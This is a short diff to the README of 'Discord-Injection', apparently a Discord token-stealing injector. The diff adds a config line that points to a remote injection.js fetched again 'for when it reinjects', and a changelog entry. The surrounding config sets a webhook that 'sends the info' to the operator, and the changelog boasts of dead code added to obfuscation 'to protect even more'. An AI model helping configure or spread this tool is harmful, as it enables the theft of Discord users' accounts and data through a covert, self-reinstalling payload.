@@ -78,6 +78,7 @@ const config = {
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info
     embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     webhook: '%WEBHOOK%', //your discord webhook there obviously
+    injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
 
     ... //rest of the config you should NOT touch
 };
@@ -146,6 +147,8 @@ This project is licensed under the GNU General Public License v3.0 License - see
 
 ## 💭・ChangeLog
 ```diff
+
+v0.0.1 ⋮ 2022-03-28
 + Added BetterDiscord support
 + Added dead code into obfuscation to protect even more
 - Accidently removed status code checker
